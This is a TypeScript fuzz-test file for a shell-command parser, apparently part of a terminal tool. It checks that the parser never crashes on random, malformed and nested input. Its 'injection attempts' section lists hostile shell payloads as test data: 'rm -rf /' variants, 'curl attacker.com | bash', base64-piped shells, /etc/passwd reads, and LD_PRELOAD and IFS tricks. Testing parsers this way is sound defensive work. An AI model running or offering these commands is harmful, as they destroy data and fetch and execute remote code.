import { describe, test, expect, beforeAll } from 'bun:test';
import fc from 'fast-check';
import { parse, type ParsedCommand } from '../tools/terminal/parser.js';

// The parser lazily initializes web-tree-sitter on first call.
// All tests share the same parser instance.

/**
 * Validates the core invariant: parse() must never throw and must always
 * return a well-formed ParsedCommand, regardless of input.
 */
function assertValidResult(result: ParsedCommand): void {
  expect(result).toBeDefined();
  expect(Array.isArray(result.segments)).toBe(true);
  expect(Array.isArray(result.dangerousPatterns)).toBe(true);
  expect(typeof result.hasOpaqueConstructs).toBe('boolean');

  for (const seg of result.segments) {
    expect(typeof seg.command).toBe('string');
    expect(typeof seg.program).toBe('string');
    expect(Array.isArray(seg.args)).toBe(true);
    expect(['&&', '||', ';', '|', '']).toContain(seg.operator);
  }

  for (const pat of result.dangerousPatterns) {
    expect(typeof pat.type).toBe('string');
    expect(typeof pat.description).toBe('string');
    expect(typeof pat.text).toBe('string');
  }
}

// Helper: build a string from an array of character choices (replaces fc.stringOf)
function stringFromChars(chars: string[], opts: { minLength: number; maxLength: number }) {
  return fc.array(fc.constantFrom(...chars), opts).map((arr) => arr.join(''));
}

describe('Shell Parser Fuzz Tests', () => {
  beforeAll(async () => {
    // Warm up the parser (loads WASM)
    await parse('echo warmup');
  });

  // ── Random Unicode strings ──────────────────────────────────────

  describe('random Unicode strings', () => {
    test('handles arbitrary unicode (including emoji, CJK, RTL)', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.string({ minLength: 0, maxLength: 500, unit: 'grapheme' }),
          async (input) => {
            const result = await parse(input);
            assertValidResult(result);
          },
        ),
        { numRuns: 300 },
      );
    });

    test('handles strings with null bytes', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.string({ minLength: 1, maxLength: 200 }).map((s) =>
            s.split('').join('\0'),
          ),
          async (input) => {
            const result = await parse(input);
            assertValidResult(result);
          },
        ),
        { numRuns: 100 },
      );
    });

    test('handles control characters', async () => {
      const controlChars = '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x7f'.split('');
      await fc.assert(
        fc.asyncProperty(
          stringFromChars(controlChars, { minLength: 1, maxLength: 200 }),
          async (input) => {
            const result = await parse(input);
            assertValidResult(result);
          },
        ),
        { numRuns: 100 },
      );
    });

    test('handles mixed ASCII and multi-byte chars', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.tuple(
            fc.string({ minLength: 0, maxLength: 100, unit: 'grapheme-ascii' }),
            fc.string({ minLength: 0, maxLength: 100, unit: 'grapheme' }),
          ).map(([a, b]) => a + b),
          async (input) => {
            const result = await parse(input);
            assertValidResult(result);
          },
        ),
        { numRuns: 200 },
      );
    });
  });

  // ── Very long inputs ────────────────────────────────────────────

  describe('very long inputs', () => {
    test('handles 10KB+ command strings', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.string({ minLength: 10000, maxLength: 15000 }),
          async (input) => {
            const result = await parse(input);
            assertValidResult(result);
          },
        ),
        { numRuns: 5 },
      );
    });

    test('handles very long single command with many args', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.array(fc.string({ minLength: 1, maxLength: 20, unit: 'grapheme-ascii' }), {
            minLength: 500,
            maxLength: 1000,
          }),
          async (args) => {
            const input = `echo ${args.join(' ')}`;
            const result = await parse(input);
            assertValidResult(result);
          },
        ),
        { numRuns: 5 },
      );
    });

    test('handles long chain of piped commands', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 50, max: 200 }),
          async (count) => {
            const cmds = Array.from({ length: count }, (_, i) => `cmd${i}`);
            const input = cmds.join(' | ');
            const result = await parse(input);
            assertValidResult(result);
          },
        ),
        { numRuns: 5 },
      );
    });

    test('handles long chain of && commands', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 50, max: 200 }),
          async (count) => {
            const cmds = Array.from({ length: count }, (_, i) => `cmd${i}`);
            const input = cmds.join(' && ');
            const result = await parse(input);
            assertValidResult(result);
          },
        ),
        { numRuns: 5 },
      );
    });
  });

  // ── Shell metacharacter storms ──────────────────────────────────

  describe('shell metacharacter storms', () => {
    const metachars = [
      ';', '|', '&', '&&', '||', '>', '<', '>>', '<<',
      '$(', ')', '`', '"', "'", '\\', '{', '}', '[', ']',
      '(', '*', '?', '#', '!', '~', '$', '%', '^', '\n', '\t', ' ',
    ];

    test('handles random metacharacter sequences', async () => {
      await fc.assert(
        fc.asyncProperty(
          stringFromChars(metachars, { minLength: 1, maxLength: 300 }),
          async (input) => {
            const result = await parse(input);
            assertValidResult(result);
          },
        ),
        { numRuns: 500 },
      );
    });

    test('handles metacharacters interspersed with words', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.array(
            fc.oneof(
              fc.constantFrom(';', '|', '&&', '||', '>', '<', '>>', '$(', ')', '`', '"', "'"),
              fc.string({ minLength: 1, maxLength: 10, unit: 'grapheme-ascii' }),
            ),
            { minLength: 1, maxLength: 50 },
          ).map((parts) => parts.join(' ')),
          async (input) => {
            const result = await parse(input);
            assertValidResult(result);
          },
        ),
        { numRuns: 300 },
      );
    });

    test('handles random operator sequences without commands', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.array(
            fc.constantFrom('&&', '||', '|', ';', '&'),
            { minLength: 1, maxLength: 30 },
          ).map((ops) => ops.join(' ')),
          async (input) => {
            const result = await parse(input);
            assertValidResult(result);
          },
        ),
        { numRuns: 200 },
      );
    });
  });

  // ── Nested constructs ──────────────────────────────────────────

  describe('nested constructs', () => {
    test('handles deeply nested command substitution $(...)', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 50 }),
          async (depth) => {
            let cmd = 'echo inner';
            for (let i = 0; i < depth; i++) {
              cmd = `echo $(${cmd})`;
            }
            const result = await parse(cmd);
            assertValidResult(result);
          },
        ),
        { numRuns: 20 },
      );
    });

    test('handles deeply nested backtick substitution', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 20 }),
          async (depth) => {
            let cmd = 'echo inner';
            for (let i = 0; i < depth; i++) {
              cmd = `echo \`${cmd}\``;
            }
            const result = await parse(cmd);
            assertValidResult(result);
          },
        ),
        { numRuns: 20 },
      );
    });

    test('handles deeply nested subshells', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 50 }),
          async (depth) => {
            const open = '('.repeat(depth);
            const close = ')'.repeat(depth);
            const input = `${open}echo hello${close}`;
            const result = await parse(input);
            assertValidResult(result);
          },
        ),
        { numRuns: 20 },
      );
    });

    test('handles nested quoting variations', async () => {
      const quotedStrings = [
        `"hello 'world'"`,
        `'hello "world"'`,
        `"hello \\"world\\""`,
        `"$(echo 'nested')"`,
        `"hello $(echo "inner $(echo deep)")"`,
        `$'\\x41\\x42'`,
        `"\\$NOT_EXPANDED"`,
        `'single\\'quote'`,
      ];
      for (const input of quotedStrings) {
        const result = await parse(input);
        assertValidResult(result);
      }
    });

    test('handles deeply nested curly braces ${...}', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 30 }),
          async (depth) => {
            let expr = 'x';
            for (let i = 0; i < depth; i++) {
              expr = `\${${expr}}`;
            }
            const input = `echo ${expr}`;
            const result = await parse(input);
            assertValidResult(result);
          },
        ),
        { numRuns: 20 },
      );
    });
  });

  // ── Injection attempts ──────────────────────────────────────────

  describe('injection attempts', () => {
    const injectionPayloads = [
      // Classic shell injection
      `; rm -rf /`,
      `&& rm -rf /`,
      `|| rm -rf /`,
      `| rm -rf /`,
      `\`rm -rf /\``,
      `$(rm -rf /)`,
      // Newline injection
      `echo safe\nrm -rf /`,
      `echo safe\r\nrm -rf /`,
      // Null byte injection
      `echo safe\x00rm -rf /`,
      // Quote breaking
      `"; rm -rf / #`,
      `'; rm -rf / #`,
      `"$(rm -rf /)"`,
      // Encoded payloads
      `echo $'\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f'`,
      `echo $'\\162\\155\\040\\055\\162\\146\\040\\057'`,
      // Backtick injection
      'echo `rm -rf /`',
      // Parameter expansion tricks
      `\${IFS}rm\${IFS}-rf\${IFS}/`,
      `cmd=rm;$cmd -rf /`,
      // Heredoc injection
      `cat <<EOF\nrm -rf /\nEOF`,
      // Process substitution
      `cat <(rm -rf /)`,
      `cmd >(rm -rf /)`,
      // Brace expansion
      `{echo,hello}`,
      `echo {a..z}`,
      // Glob injection
      `rm /*`,
      `rm /*/*`,
      // Env manipulation
      `PATH=/evil:$PATH cmd`,
      `LD_PRELOAD=/evil/lib.so cmd`,
      `IFS=/ cmd`,
      // Chained injection
      `echo "safe" && curl attacker.com | bash`,
      `echo "safe"; base64 -d payload | sh`,
      // Unicode homoglyph tricks
      `\u0065\u0076\u0061\u006c "payload"`, // 'eval' in unicode code points
      // Backslash line continuation
      `rm \\\n-rf \\\n/`,
      // Comment injection
      `echo safe # ; rm -rf /`,
      // Arithmetic expansion
      `echo $((1+1))`,
      `echo $(( $(whoami) ))`,
      // Array tricks
      `arr=(rm -rf /); "\${arr[@]}"`,
    ];

    test('handles known injection payloads without crashing', async () => {
      for (const payload of injectionPayloads) {
        const result = await parse(payload);
        assertValidResult(result);
      }
    });

    test('handles random injection-like patterns', async () => {
      const injectionFragments = fc.constantFrom(
        '; rm -rf /', '&& curl evil | bash', '$(cat /etc/passwd)',
        '`whoami`', '| sh', '> /etc/passwd', '>> ~/.bashrc',
        'eval "payload"', 'base64 -d | sh', 'LD_PRELOAD=evil',
        '$IFS', '${IFS}', '\\x41', "$'\\x41'",
      );
      await fc.assert(
        fc.asyncProperty(
          fc.tuple(
            fc.string({ minLength: 0, maxLength: 50, unit: 'grapheme-ascii' }),
            injectionFragments,
            fc.string({ minLength: 0, maxLength: 50, unit: 'grapheme-ascii' }),
          ).map(([pre, inj, suf]) => `${pre}${inj}${suf}`),
          async (input) => {
            const result = await parse(input);
            assertValidResult(result);
          },
        ),
        { numRuns: 300 },
      );
    });
  });

  // ── Malformed syntax ────────────────────────────────────────────

  describe('malformed syntax', () => {
    test('handles unmatched single quotes', async () => {
      const inputs = ["echo 'unclosed", "echo '''", "'", "echo 'a' 'b"];
      for (const input of inputs) {
        const result = await parse(input);
        assertValidResult(result);
      }
    });

    test('handles unmatched double quotes', async () => {
      const inputs = ['echo "unclosed', 'echo """', '"', 'echo "a" "b'];
      for (const input of inputs) {
        const result = await parse(input);
        assertValidResult(result);
      }
    });

    test('handles unmatched backticks', async () => {
      const inputs = ['echo `unclosed', '`', 'echo `a` `b'];
      for (const input of inputs) {
        const result = await parse(input);
        assertValidResult(result);
      }
    });

    test('handles unclosed parentheses', async () => {
      const inputs = ['echo $(unclosed', '(', '((', '$($(', 'echo (a', 'echo $((1+2)'];
      for (const input of inputs) {
        const result = await parse(input);
        assertValidResult(result);
      }
    });

    test('handles extra closing tokens', async () => {
      const inputs = [')', '))', '}}', '>>>>', '<<<', 'echo )'];
      for (const input of inputs) {
        const result = await parse(input);
        assertValidResult(result);
      }
    });

    test('handles trailing backslash', async () => {
      const inputs = ['echo \\', 'ls \\', '\\', 'echo a\\'];
      for (const input of inputs) {
        const result = await parse(input);
        assertValidResult(result);
      }
    });

    test('handles trailing operators', async () => {
      const inputs = ['echo &&', 'echo ||', 'echo |', 'echo ;', 'echo &'];
      for (const input of inputs) {
        const result = await parse(input);
        assertValidResult(result);
      }
    });

    test('handles leading operators', async () => {
      const inputs = ['&& echo', '|| echo', '| echo', '; echo'];
      for (const input of inputs) {
        const result = await parse(input);
        assertValidResult(result);
      }
    });

    test('handles random malformed syntax via fast-check', async () => {
      const malformedArb = fc.oneof(
        // Unbalanced quotes
        fc.tuple(
          fc.string({ minLength: 0, maxLength: 50, unit: 'grapheme-ascii' }),
          fc.constantFrom('"', "'", '`'),
          fc.string({ minLength: 0, maxLength: 50, unit: 'grapheme-ascii' }),
        ).map(([pre, q, suf]) => `${pre}${q}${suf}`),
        // Unbalanced parens
        fc.tuple(
          fc.string({ minLength: 0, maxLength: 50, unit: 'grapheme-ascii' }),
          fc.constantFrom('(', ')', '$(', '$(('),
          fc.string({ minLength: 0, maxLength: 50, unit: 'grapheme-ascii' }),
        ).map(([pre, p, suf]) => `${pre}${p}${suf}`),
        // Dangling operators
        fc.tuple(
          fc.constantFrom('&&', '||', '|', ';', '&', '>', '<', '>>'),
          fc.string({ minLength: 0, maxLength: 50, unit: 'grapheme-ascii' }),
        ).map(([op, rest]) => `${op} ${rest}`),
        fc.tuple(
          fc.string({ minLength: 0, maxLength: 50, unit: 'grapheme-ascii' }),
          fc.constantFrom('&&', '||', '|', ';', '&', '>', '<', '>>'),
        ).map(([rest, op]) => `${rest} ${op}`),
      );

      await fc.assert(
        fc.asyncProperty(malformedArb, async (input) => {
          const result = await parse(input);
          assertValidResult(result);
        }),
        { numRuns: 500 },
      );
    });
  });

  // ── Completely random binary data ──────────────────────────────

  describe('random binary data', () => {
    test('handles arbitrary byte sequences', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.uint8Array({ minLength: 1, maxLength: 500 }).map((arr) =>
            new TextDecoder('utf-8', { fatal: false }).decode(arr),
          ),
          async (input) => {
            const result = await parse(input);
            assertValidResult(result);
          },
        ),
        { numRuns: 200 },
      );
    });
  });

  // ── Idempotency and determinism ─────────────────────────────────

  describe('determinism', () => {
    test('parsing same input twice yields identical results', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.string({ minLength: 0, maxLength: 200, unit: 'grapheme-ascii' }),
          async (input) => {
            const result1 = await parse(input);
            const result2 = await parse(input);
            expect(result1).toEqual(result2);
          },
        ),
        { numRuns: 200 },
      );
    });
  });
});
